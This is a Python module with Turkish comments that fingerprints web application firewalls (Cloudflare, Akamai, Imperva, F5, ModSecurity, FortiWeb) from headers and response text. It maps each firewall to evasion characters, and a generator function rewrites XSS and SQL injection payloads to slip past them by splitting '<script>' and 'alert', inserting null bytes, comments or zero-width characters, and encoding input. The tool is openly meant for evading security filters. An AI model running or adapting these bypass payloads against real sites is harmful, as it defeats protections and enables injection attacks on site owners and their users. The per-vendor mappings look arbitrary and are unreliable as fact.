"""
WAF tespit ve bypass modülü
"""
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

class WAFType(Enum):
    """WAF türleri"""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    F5_ASM = "f5_asm"
    MODSECURITY = "modsecurity"
    FORTIWEB = "fortiweb"
    UNKNOWN = "unknown"

@dataclass
class WAFDetectionResult:
    """WAF tespit sonucu"""
    detected: bool
    waf_type: WAFType
    confidence: float
    details: str

class WAFDetector:
    """WAF tespit sınıfı"""
    
    @staticmethod
    def get_waf_signatures() -> Dict[WAFType, Dict[str, List[str]]]:
        """WAF imza veritabanı"""
        return {
            WAFType.CLOUDFLARE: {
                "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
                "response_patterns": ["cloudflare ray id:", "error 1015"],
                "block_patterns": ["challenge-form", "jschal-answer"]
            },
            WAFType.AKAMAI: {
                "headers": ["x-akamai-transformed", "akamai-origin-hop"],
                "response_patterns": ["access denied | akamai", "denied.akamai.com"],
                "block_patterns": ["ak-error-page", "reference"]
            },
            WAFType.IMPERVA: {
                "headers": ["x-iinfo", "x-cdn"],
                "response_patterns": ["incapsula incident id", "powered by incapsula"],
                "block_patterns": ["incap_ses_", "_incap_"]
            },
            WAFType.F5_ASM: {
                "headers": ["x-wa-info", "x-ts-block"],
                "response_patterns": ["the requested url was rejected", "request rejected"],
                "block_patterns": ["support id:", "reference:"]
            },
            WAFType.MODSECURITY: {
                "headers": ["mod_security", "mod_security_crs"],
                "response_patterns": ["mod_security rules triggered", "blocked by mod_security"],
                "block_patterns": ["error 403", "forbidden"]
            },
            WAFType.FORTIWEB: {
                "headers": ["x-fortigate", "x-fortiweb-"],
                "response_patterns": ["fortiweb firewall", "fortigate application control"],
                "block_patterns": ["fortigate", "fortiweb"]
            }
        }

    @staticmethod
    def get_waf_bypass_techniques() -> Dict[WAFType, List[str]]:
        """WAF bypass teknikleri"""
        return {
            WAFType.CLOUDFLARE: [
                "\\x00",  # Null byte
                "/**/",   # Comment bypass
                "/*!*/",  # MySQL comment bypass
                "%0a",    # URL encoded newline
                "%0d",    # URL encoded carriage return
                "\\u0000" # Unicode null byte
            ],
            WAFType.AKAMAI: [
                "%09",    # Horizontal tab
                "%0b",    # Vertical tab
                "%0c",    # Form feed
                "%20",    # Space
                "/*-*/",  # Comment bypass
                "\\u200b" # Zero width space
            ],
            WAFType.IMPERVA: [
                "%0e",    # Shift out
                "%0f",    # Shift in
                "%7f",    # Delete
                "\\t",    # Tab
                "\\n",    # Newline
                "\\r"     # Carriage return
            ],
            WAFType.F5_ASM: [
                "%u0009", # URL encoded tab
                "%u000a", # URL encoded newline
                "%u000d", # URL encoded carriage return
                "\\x09",  # Hex encoded tab
                "\\x0a",  # Hex encoded newline
                "\\x0d"   # Hex encoded carriage return
            ],
            WAFType.MODSECURITY: [
                "&#x09;", # HTML encoded tab
                "&#x0a;", # HTML encoded newline
                "&#x0d;", # HTML encoded carriage return
                "&Tab;",  # HTML entity tab
                "&NewLine;", # HTML entity newline
                "&lrm;"   # Left-to-right mark
            ],
            WAFType.FORTIWEB: [
                "%E2%80%8B", # Zero width space
                "%E2%80%8C", # Zero width non-joiner
                "%E2%80%8D", # Zero width joiner
                "%E2%80%8E", # Left-to-right mark
                "%E2%80%8F", # Right-to-left mark
                "%E2%80%AA"  # Left-to-right embedding
            ]
        }

    @staticmethod
    def detect_waf(response_headers: Dict[str, str], response_content: str) -> WAFDetectionResult:
        """WAF varlığını tespit et"""
        signatures = WAFDetector.get_waf_signatures()
        
        for waf_type, patterns in signatures.items():
            confidence = 0.0
            matches = []
            
            # Header kontrolü
            for header in patterns["headers"]:
                if any(h.lower() == header.lower() for h in response_headers):
                    confidence += 0.3
                    matches.append(f"Header bulundu: {header}")
            
            # Response pattern kontrolü
            for pattern in patterns["response_patterns"]:
                if pattern.lower() in response_content.lower():
                    confidence += 0.3
                    matches.append(f"Response pattern bulundu: {pattern}")
            
            # Block pattern kontrolü
            for pattern in patterns["block_patterns"]:
                if pattern.lower() in response_content.lower():
                    confidence += 0.4
                    matches.append(f"Block pattern bulundu: {pattern}")
            
            if confidence > 0:
                return WAFDetectionResult(
                    detected=True,
                    waf_type=waf_type,
                    confidence=min(confidence, 1.0),
                    details=", ".join(matches)
                )
        
        return WAFDetectionResult(
            detected=False,
            waf_type=WAFType.UNKNOWN,
            confidence=0.0,
            details="WAF tespit edilemedi"
        )

    @staticmethod
    def get_bypass_payloads(waf_type: WAFType, original_payload: str) -> List[str]:
        """WAF bypass payload'ları üret"""
        bypass_techniques = WAFDetector.get_waf_bypass_techniques().get(waf_type, [])
        bypass_payloads = []
        
        for technique in bypass_techniques:
            # Boşluk karakterlerini bypass teknikleri ile değiştir
            bypass_payload = original_payload.replace(" ", technique)
            bypass_payloads.append(bypass_payload)
            
            # Script tag'lerini parçala
            if "<script>" in original_payload:
                bypass_payload = original_payload.replace("<script>", f"<scr{technique}ipt>")
                bypass_payloads.append(bypass_payload)
            
            # Alert fonksiyonunu encode et
            if "alert" in original_payload:
                bypass_payload = original_payload.replace("alert", f"a{technique}lert")
                bypass_payloads.append(bypass_payload)
            
            # Tırnak işaretlerini escape et
            bypass_payload = original_payload.replace("'", f"\\{technique}'")
            bypass_payloads.append(bypass_payload)
            
            # Özel karakterleri HTML encode et
            bypass_payload = original_payload.replace("<", "&#x3c;").replace(">", "&#x3e;")
            bypass_payloads.append(bypass_payload)
        
        return bypass_payloads 